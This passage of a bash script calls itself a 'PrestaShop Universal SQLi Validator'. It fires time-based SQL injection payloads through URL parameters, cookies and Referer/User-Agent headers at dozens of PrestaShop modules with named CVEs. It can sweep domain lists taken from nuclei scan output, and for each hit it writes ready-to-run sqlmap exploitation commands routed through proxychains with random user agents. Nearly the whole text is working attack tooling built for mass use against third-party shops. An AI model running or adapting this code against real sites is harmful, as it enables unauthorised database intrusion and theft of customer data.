# ambjolisearch: search_query
# ============================================
check_ambjolisearch_sqli() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="ambjolisearch-sqli"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] ambjolisearch — search_query time${NC}"

    local CHK_HTTP=$(curl -sk -o /dev/null -w "%{http_code}" -m 8 -L "${BASE_URL}/module/ambjolisearch/jolisearch" 2>/dev/null)
    if [ "$CHK_HTTP" = "404" ] || [ "$CHK_HTTP" = "403" ]; then
        echo -e "${RED}  Module not found${NC}"
        return
    fi

    local DUR=$(time_check "${BASE_URL}/module/ambjolisearch/jolisearch?search_query=1'+AND+(SELECT+1+FROM+(SELECT+SLEEP(${SLEEP_SEC}))a)--+-" "GET")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "search_query time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/module/ambjolisearch/jolisearch?search_query=1\" -p search_query --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# cookie-sqli: pshowconversion
# ============================================
check_cookie_sqli() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2023-6921"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] cookie pshowconversion — time${NC}"

    local DUR_CTRL=$(time_check "${BASE_URL}/" "GET" "" "Cookie: pshowconversion=1" "2")
    if [ "$DUR_CTRL" -ge "$THRESHOLD" ]; then
        echo -e "${RED}  Baseline too slow (${DUR_CTRL}s), skipping${NC}"
        return
    fi

    local DUR=$(time_check "${BASE_URL}/" "GET" "" "Cookie: pshowconversion=1'XOR(if(now()=sysdate(),sleep(${SLEEP_SEC}),0))XOR'Z")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "pshowconversion cookie time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/\" --cookie=\"pshowconversion=1\" -p pshowconversion --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# cookie-farmaspeedido-sqli: farmaspeedido
# ============================================
check_cookie_farmaspeedido_sqli() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="cookie-farmaspeedido-sqli"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] cookie farmaspeedido — time${NC}"

    local DUR_CTRL=$(time_check "${BASE_URL}/" "GET" "" "Cookie: farmaspeedido=1" "2")
    if [ "$DUR_CTRL" -ge "$THRESHOLD" ]; then
        echo -e "${RED}  Baseline too slow (${DUR_CTRL}s), skipping${NC}"
        return
    fi

    local DUR=$(time_check "${BASE_URL}/" "GET" "" "Cookie: farmaspeedido=1'XOR(if(now()=sysdate(),sleep(${SLEEP_SEC}),0))XOR'Z")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "farmaspeedido cookie time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/\" --cookie=\"farmaspeedido=1\" -p farmaspeedido --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# header-referer-sqli: Referer
# ============================================
check_header_referer_sqli() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2023-27569"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] header Referer — time${NC}"

    local DUR=$(time_check "${BASE_URL}/" "GET" "" "Referer: https://www.google.com'XOR(if(now()=sysdate(),sleep(${SLEEP_SEC}),0))XOR'Z")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "Referer header time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/\" --headers=\"Referer: *\" --technique=T --dbms=MySQL --level=3 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# header-useragent-sqli: User-Agent
# ============================================
check_header_useragent_sqli() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2023-27570"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] header User-Agent — time${NC}"

    local DUR=$(time_check "${BASE_URL}/" "GET" "" "User-Agent: Mozilla/5.0'XOR(if(now()=sysdate(),sleep(${SLEEP_SEC}),0))XOR'Z")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "User-Agent header time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/\" --headers=\"User-Agent: *\" --technique=T --dbms=MySQL --level=3 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# Main: detect CVE from nuclei output or run all
# ============================================
validate_domain() {
    local INPUT_URL="$1"
    local CVE_HINT="$2"
    local BASE_URL=$(echo "$INPUT_URL" | grep -oP 'https?://[^/\s]+')
    local DOMAIN=$(echo "$BASE_URL" | sed 's|https\?://||')

    [ -z "$DOMAIN" ] && return

    echo -e "\n${BOLD}${CYAN}============================================${NC}"
    echo -e "${BOLD}  Target: ${DOMAIN}${NC}"
    [ -n "$CVE_HINT" ] && echo -e "${BOLD}  CVE hint: ${CVE_HINT}${NC}"
    echo -e "${CYAN}============================================${NC}"

    if [ -n "$CVE_HINT" ]; then
        case "$CVE_HINT" in
            *2022-22897*) check_cve_2022_22897 "$BASE_URL" "$DOMAIN" ;;
            *2023-30150*) check_cve_2023_30150 "$BASE_URL" "$DOMAIN" ;;
            *2021-36748*) check_cve_2021_36748 "$BASE_URL" "$DOMAIN" ;;
            *2023-27847*) check_cve_2023_27847 "$BASE_URL" "$DOMAIN" ;;
            *2023-39650*) check_cve_2023_39650 "$BASE_URL" "$DOMAIN" ;;
            *2021-37538*) check_cve_2021_37538 "$BASE_URL" "$DOMAIN" ;;
            *2023-30192*) check_cve_2023_30192 "$BASE_URL" "$DOMAIN" ;;
            *2020-26248*) check_cve_2020_26248 "$BASE_URL" "$DOMAIN" ;;
            *2023-27637*) check_cve_2023_27637 "$BASE_URL" "$DOMAIN" ;;
            *2023-27638*) check_cve_2023_27638 "$BASE_URL" "$DOMAIN" ;;
            *2022-31101*) check_cve_2022_31101 "$BASE_URL" "$DOMAIN" ;;
            *2023-45375*) check_cve_2023_45375 "$BASE_URL" "$DOMAIN" ;;
            *2023-46347*) check_cve_2023_46347 "$BASE_URL" "$DOMAIN" ;;
            *2024-36683*) check_cve_2024_36683 "$BASE_URL" "$DOMAIN" ;;
            *2023-27639*) check_cve_2023_27639 "$BASE_URL" "$DOMAIN" ;;
            *2022-31181*) check_cve_2022_31181 "$BASE_URL" "$DOMAIN" ;;
            *2021-3110*)  check_cve_2020_26248 "$BASE_URL" "$DOMAIN" ;;
            *2025-69633*) check_cve_2025_69633 "$BASE_URL" "$DOMAIN" ;;
            *2018-11548*) check_cve_2018_11548 "$BASE_URL" "$DOMAIN" ;;
            *2023-46349*) check_cve_2023_46349 "$BASE_URL" "$DOMAIN" ;;
            *2023-50026*) check_cve_2023_50026 "$BASE_URL" "$DOMAIN" ;;
            *2023-50028*) check_cve_2023_50028 "$BASE_URL" "$DOMAIN" ;;
            *2024-25843*) check_cve_2024_25843 "$BASE_URL" "$DOMAIN" ;;
            *2024-28391*) check_cve_2024_28391 "$BASE_URL" "$DOMAIN" ;;
            *2024-28392*) check_cve_2024_28392 "$BASE_URL" "$DOMAIN" ;;
            *2024-33266*) check_cve_2024_33266 "$BASE_URL" "$DOMAIN" ;;
            *2024-33269*) check_cve_2024_33269 "$BASE_URL" "$DOMAIN" ;;
            *2024-36680*) check_cve_2024_36680 "$BASE_URL" "$DOMAIN" ;;
            *apmarketplace*) check_apmarketplace_sqli "$BASE_URL" "$DOMAIN" ;;
            *blocklayered*) check_blocklayered_sqli "$BASE_URL" "$DOMAIN" ;;
            *azendo*send*cart*) check_azendo_send_cart_sqli "$BASE_URL" "$DOMAIN" ;;
            *filterproductspro*) check_filterproductspro_sqli "$BASE_URL" "$DOMAIN" ;;
            *gsnippetsreviews*) check_gsnippetsreviews_sqli "$BASE_URL" "$DOMAIN" ;;
            *ifeedback*) check_ifeedback_sqli "$BASE_URL" "$DOMAIN" ;;
            *jxadvancedfilter*) check_jxadvancedfilter_sqli "$BASE_URL" "$DOMAIN" ;;
            *kbgdpr*|*2024-8465*) check_kbgdpr_sqli "$BASE_URL" "$DOMAIN" ;;
            *leoproductsearch*) check_leoproductsearch_sqli "$BASE_URL" "$DOMAIN" ;;
            *searchbyfeatures*) check_searchbyfeatures_sqli "$BASE_URL" "$DOMAIN" ;;
            *vatnumber*) check_vatnumber_sqli "$BASE_URL" "$DOMAIN" ;;
            *smartblog*id_post*|*smartblog-id_post*|*2020-36972*) check_smartblog_id_post_sqli "$BASE_URL" "$DOMAIN" ;;
            *ambjolisearch*) check_ambjolisearch_sqli "$BASE_URL" "$DOMAIN" ;;
            *cookie-sqli*|*cookie*pshowconversion*|*2023-6921*) check_cookie_sqli "$BASE_URL" "$DOMAIN" ;;
            *cookie*farmaspeedido*) check_cookie_farmaspeedido_sqli "$BASE_URL" "$DOMAIN" ;;
            *header*referer*|*2023-27569*) check_header_referer_sqli "$BASE_URL" "$DOMAIN" ;;
            *header*useragent*|*2023-27570*) check_header_useragent_sqli "$BASE_URL" "$DOMAIN" ;;
            *) echo -e "${RED}  Unknown CVE: ${CVE_HINT}${NC}" ;;
        esac
    else
        check_cve_2022_22897 "$BASE_URL" "$DOMAIN"
        check_cve_2023_30150 "$BASE_URL" "$DOMAIN"
        check_cve_2021_36748 "$BASE_URL" "$DOMAIN"
        check_cve_2023_27847 "$BASE_URL" "$DOMAIN"
        check_cve_2023_39650 "$BASE_URL" "$DOMAIN"
        check_cve_2021_37538 "$BASE_URL" "$DOMAIN"
        check_cve_2023_30192 "$BASE_URL" "$DOMAIN"
        check_cve_2020_26248 "$BASE_URL" "$DOMAIN"
        check_cve_2023_27637 "$BASE_URL" "$DOMAIN"
        check_cve_2023_27638 "$BASE_URL" "$DOMAIN"
        check_cve_2022_31101 "$BASE_URL" "$DOMAIN"
        check_cve_2023_45375 "$BASE_URL" "$DOMAIN"
        check_cve_2023_46347 "$BASE_URL" "$DOMAIN"
        check_cve_2024_36683 "$BASE_URL" "$DOMAIN"
        check_cve_2023_27639 "$BASE_URL" "$DOMAIN"
        check_cve_2022_31181 "$BASE_URL" "$DOMAIN"
        check_cve_2025_69633 "$BASE_URL" "$DOMAIN"
        check_apmarketplace_sqli "$BASE_URL" "$DOMAIN"
        check_cve_2018_11548 "$BASE_URL" "$DOMAIN"
        check_cve_2023_46349 "$BASE_URL" "$DOMAIN"
        check_cve_2023_50026 "$BASE_URL" "$DOMAIN"
        check_cve_2023_50028 "$BASE_URL" "$DOMAIN"
        check_cve_2024_25843 "$BASE_URL" "$DOMAIN"
        check_cve_2024_28391 "$BASE_URL" "$DOMAIN"
        check_cve_2024_28392 "$BASE_URL" "$DOMAIN"
        check_cve_2024_33266 "$BASE_URL" "$DOMAIN"
        check_cve_2024_33269 "$BASE_URL" "$DOMAIN"
        check_cve_2024_36680 "$BASE_URL" "$DOMAIN"
        check_blocklayered_sqli "$BASE_URL" "$DOMAIN"
        check_azendo_send_cart_sqli "$BASE_URL" "$DOMAIN"
        check_filterproductspro_sqli "$BASE_URL" "$DOMAIN"
        check_gsnippetsreviews_sqli "$BASE_URL" "$DOMAIN"
        check_ifeedback_sqli "$BASE_URL" "$DOMAIN"
        check_jxadvancedfilter_sqli "$BASE_URL" "$DOMAIN"
        check_kbgdpr_sqli "$BASE_URL" "$DOMAIN"
        check_leoproductsearch_sqli "$BASE_URL" "$DOMAIN"
        check_searchbyfeatures_sqli "$BASE_URL" "$DOMAIN"
        check_vatnumber_sqli "$BASE_URL" "$DOMAIN"
        check_smartblog_id_post_sqli "$BASE_URL" "$DOMAIN"
        check_ambjolisearch_sqli "$BASE_URL" "$DOMAIN"
        check_cookie_sqli "$BASE_URL" "$DOMAIN"
        check_cookie_farmaspeedido_sqli "$BASE_URL" "$DOMAIN"
        check_header_referer_sqli "$BASE_URL" "$DOMAIN"
        check_header_useragent_sqli "$BASE_URL" "$DOMAIN"
    fi
}

# ============================================
# Entry point
# ============================================
if [ -z "$1" ]; then
    echo "Usage: $0 [-o output_dir] <nuclei_output.txt | url>"
    echo ""
    echo "Options:"
    echo "  -o DIR  Save results to DIR (created if not exists)"
    echo "          Default: /tmp/validate_YYYYMMDD_HHMMSS"
    echo ""
    echo "Examples:"
    echo "  $0 https://target.com                    # Run ALL checks"
    echo "  $0 nuclei_results.txt                    # Auto-detect CVE from nuclei output"
    echo "  $0 -o ./results nuclei_results.txt       # Save to ./results/"
    echo ""
    echo "Supported checks (42):"
    echo ""
    echo "  CVE-based (28):"
    echo "  CVE-2018-11548  bamegamenu (code time)"
    echo "  CVE-2020-26248  productcomments (id_products time)"
    echo "  CVE-2021-36748  ph_simpleblog (sb_category blind)"
    echo "  CVE-2021-37538  smartblog (day union)"
    echo "  CVE-2022-22897  appagebuilder (product_one_img, pro_add)"
    echo "  CVE-2022-31101  blockwishlist (order time)"
    echo "  CVE-2022-31181  blockwishlist (order stacked, needs auth)"
    echo "  CVE-2023-27637  tshirtecommerce (product_id time)"
    echo "  CVE-2023-27638  tshirtecommerce (design_cart_id time)"
    echo "  CVE-2023-27639  tshirtecommerce (ajax.php file read)"
    echo "  CVE-2023-27847  xipblog (subpage_type time/blind/union)"
    echo "  CVE-2023-30150  leocustomajax (pro_add, cat_list)"
    echo "  CVE-2023-30192  possearchproducts (id_category time)"
    echo "  CVE-2023-39650  tvcmsblog (page_type time/blind)"
    echo "  CVE-2023-45375  pireospay (MerchantReference stacked)"
    echo "  CVE-2023-46347  ndk_steppingpack (search_query stacked/union)"
    echo "  CVE-2023-46349  pk_customlinks (id time)"
    echo "  CVE-2023-50026  hsmultiaccessoriespro (id_products time)"
    echo "  CVE-2023-50028  blockslidingcart (id time)"
    echo "  CVE-2024-25843  ba_importer (id time)"
    echo "  CVE-2024-28391  quickproducttable (search time)"
    echo "  CVE-2024-28392  pscartabandonmentpro (email_id time)"
    echo "  CVE-2024-33266  deliveryorderautoupdate (lang time)"
    echo "  CVE-2024-33269  flashsales (id time)"
    echo "  CVE-2024-36680  pkfacebook (email time)"
    echo "  CVE-2024-36683  productsalert (paemail time)"
    echo "  CVE-2025-69633  advancedpopupcreator (fromController time)"
    echo "  apmarketplace   apmarketplace (email time)"
    echo ""
    echo "  Module-specific (10):"
    echo "  blocklayered       (layered_price_slider time)"
    echo "  azendo_send_cart   (data[0][value] time)"
    echo "  filterproductspro  (params[searcher] time)"
    echo "  gsnippetsreviews   (iId time)"
    echo "  ifeedback          (star time)"
    echo "  jxadvancedfilter   (feature_2 time)"
    echo "  kbgdpr / CVE-2024-8465  (rand time)"
    echo "  leoproductsearch   (q time)"
    echo "  searchbyfeatures   (feature[2] time)"
    echo "  vatnumber          (id_country time)"
    echo ""
    echo "  Generic vectors (4):"
    echo "  smartblog-id_post / CVE-2020-36972  (id_post time)"
    echo "  ambjolisearch      (search_query time)"
    echo "  cookie-sqli / CVE-2023-6921  (pshowconversion / farmaspeedido)"
    echo "  header-sqli / CVE-2023-27569+CVE-2023-27570  (Referer / User-Agent)"
    exit 1
fi

echo -e "${BOLD}${CYAN}============================================${NC}"
echo -e "${BOLD}  PrestaShop Universal SQLi Validator${NC}"
echo -e "${BOLD}  42 checks supported${NC}"
echo -e "${BOLD}  Output: ${OUTDIR}${NC}"
echo -e "${CYAN}============================================${NC}"

if [ -f "$1" ]; then
    if grep -qP '^\[' "$1"; then
        echo -e "${YELLOW}Nuclei output detected — auto-routing by template ID${NC}"
        SEEN_PAIRS=""
        while IFS= read -r line; do
            TMPL_ID=$(echo "$line" | grep -oP '^\[([^\]]+)\]' | tr -d '[]')
            URL=$(echo "$line" | grep -oP 'https?://[^\s]+')
            DOMAIN=$(echo "$URL" | grep -oP 'https?://[^/\s]+')
            [ -z "$TMPL_ID" ] || [ -z "$DOMAIN" ] && continue

            [[ "$TMPL_ID" == "CVE-2020-15081" ]] && continue

            PAIR="${DOMAIN}|${TMPL_ID}"
            echo "$SEEN_PAIRS" | grep -q "$PAIR" && continue
            SEEN_PAIRS="${SEEN_PAIRS}${PAIR}\n"

            validate_domain "$DOMAIN" "$TMPL_ID"
        done < "$1"
    else
        echo -e "${YELLOW}Domain list detected — running ALL checks per domain${NC}"
        while IFS= read -r line; do
            DOMAIN=$(echo "$line" | sed 's|https\?://||' | sed 's|/.*||' | tr -d '[:space:]')
            [ -z "$DOMAIN" ] && continue
            validate_domain "https://${DOMAIN}"
        done < "$1"
    fi
else
    validate_domain "$1"
fi

# ============================================
# Final report
# ============================================
echo -e "\n\n${BOLD}${CYAN}============================================${NC}"
echo -e "${BOLD}  FINAL REPORT${NC}"
echo -e "${CYAN}============================================${NC}"

TOTAL_RESULTS=$(wc -l < "$RESULTS" 2>/dev/null)
[ -z "$TOTAL_RESULTS" ] && TOTAL_RESULTS=0
CONFIRMED=$(grep -c "CONFIRMED" "$RESULTS" 2>/dev/null)
[ -z "$CONFIRMED" ] && CONFIRMED=0
LIKELY=$(grep -c "|LIKELY|" "$RESULTS" 2>/dev/null)
[ -z "$LIKELY" ] && LIKELY=0
SQLMAP_COUNT=$(wc -l < "$SQLMAP_FILE" 2>/dev/null)
[ -z "$SQLMAP_COUNT" ] && SQLMAP_COUNT=0

echo -e "  Vulnerabilities found: ${TOTAL_RESULTS}"
echo -e "  CONFIRMED:            ${CONFIRMED}"
echo -e "  LIKELY:               ${LIKELY}"
echo -e "  SQLMap commands:      ${SQLMAP_COUNT}"
echo ""

if [ "$TOTAL_RESULTS" -gt 0 ]; then
    echo -e "${BOLD}  By CVE:${NC}"
    cut -d'|' -f2 "$RESULTS" | sort | uniq -c | sort -rn | while read cnt cve; do
        echo -e "    ${cnt}x ${cve}"
    done
    echo ""
    echo -e "${BOLD}  Details:${NC}"
    while IFS='|' read -r domain cve status details; do
        if [ "$status" = "CONFIRMED" ]; then
            echo -e "  ${GREEN}[${cve}] ${domain} — ${details}${NC}"
        else
            echo -e "  ${YELLOW}[${cve}] ${domain} — ${details}${NC}"
        fi
    done < "$RESULTS"
fi

VULN_DOMAINS_COUNT=$(wc -l < "$VULN_DOMAINS" 2>/dev/null)
[ -z "$VULN_DOMAINS_COUNT" ] && VULN_DOMAINS_COUNT=0
echo -e "  Unique vuln domains: ${VULN_DOMAINS_COUNT}"
echo ""
echo -e "  ${BOLD}Output directory: ${OUTDIR}${NC}"
echo -e "    results.txt        — domain|CVE|status|details"
echo -e "    sqlmap_commands.txt — ready sqlmap commands"
echo -e "    vuln_domains.txt   — unique vulnerable domains"
echo -e "    full_log.txt       — full console output"
echo -e "${CYAN}============================================${NC}"
